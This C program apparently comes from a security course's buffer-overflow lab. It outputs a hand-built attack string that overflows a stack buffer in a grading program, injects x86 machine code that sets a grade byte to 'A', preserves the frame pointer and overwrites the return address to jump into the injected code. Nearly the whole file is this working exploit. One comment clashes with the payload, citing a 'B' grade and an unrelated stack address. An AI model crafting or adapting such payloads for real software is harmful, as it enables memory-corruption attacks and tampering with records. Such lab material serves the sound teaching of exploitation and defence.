#include <stdio.h>
#include <string.h>
                                      /* stack location address */
char attackString[] =
    "Ja"		   /* 0xbfffeee6 */ /* Name: 0x804a060 */
    "ck D"                 /* 0xbfffeee8 */ /* Name: 0x804a062 */
    "avid"                 /* 0xbfffeeec */ /* Name: 0x804a066 */
    "son\x00"              /* 0xbfffeef0 */ /* Name: 0x804a06a */
    "\xc6\x05\x24\xa0"     /* 0xbfffeef4 */ /* Name: 0x804a06e */ /* movb $0x41,0x080c6008 addr of grade */
    "\x04\x08\x41\x90"     /* 0xbfffeef8 */ /* nop is \x90 */ 
    "\x68\x49\x85\x04"     /* 0xbfffeefc */ /* op 68 is push ret addr 0x080482f7 */
    "\x08\x90\xc3\x3e"     /* 0xbfffef00 */	/* nop is \x90; c3 is ret inst */ 
    "\x20\x20\x20\x20"     /* 0xbfffef04 */
    "\x20\x20\x20\x20"     /* 0xbfffef08 */
    "\x20\x20\x20\x20"     /* 0xbfffef0c */
    "\x20\x20\x20\x20"     /* 0xbfffef10 */
    "\x20\x20\x20\x20"     /* 0xbfffef14 */
    "\x20\x20\x20\x20"     /* 0xbfffef18 */
    "\x20\x20\x20\x20"     /* 0xbfffef1c */
    "\x20\x20\x20\x20"     /* 0xbfffef20 */
    "\x20\x20\x20\x20"     /* 0xbfffef24 */
    "\x20\x20\x20\x20"     /* 0xbfffef28 */
    "\x20\x20\x20\x20"     /* 0xbfffef2c */
    "\x20\x20\x20\x20"     /* 0xbfffef30 */
    "\x20\x20\x20\x20"     /* 0xbfffef34 */
    "\x20\x20\x20\x20"     /* 0xbfffef38 */
    "\x20\x20\x20\x20"     /* 0xbfffef3c */
    "\x20\x20\x20\x20"     /* 0xbfffef40 */
    "\x20\x20\x20\x20"     /* 0xbfffef44 */
    "\x62\x00\x00\x00"     /* 0xbfffef48 */	/* i here */
    "\x20\x20\x20\x20"     /* 0xbfffef4c */ 	/* c here */
    "\x20\x20\x20\x20"     /* 0xbfffef50 */
    "\x20\x20\x20\x20"     /* 0xbfffef54 */
    "\x78\xef\xff\xbf"     /* 0xbfffef58 */	/* ebp  aka frame ptr */
    "\x6e\xa0\x04\x08"     /* 0xbfffef5c */	/* return address should b
							the addr of Name 
							where injection code is
							0x804a06e */
    "\x60\xa0\x04\x08"     /* 0xbfffef60 */ 	/* address of Name */ 
    "\x0a\x0a\x0a\x0a" ;    /* 0xbfffef64 */
/* The key to the attack is to change the return address (located on the
   stack at address 0x22cc7c as indicated in the above picture to
   point to the code location in main where the grade is set to a "B".
   However, it is also important for the buffer overrun to preserve the
   frame pointer and the address of grade on the stack (grade is passed and s
   points to it
*/


int main() {
   int i;
   char *p = attackString;
   for (i = 0; i < sizeof(attackString); i++) {
      putchar(*p);
      p++;
   }
   return 1;
}
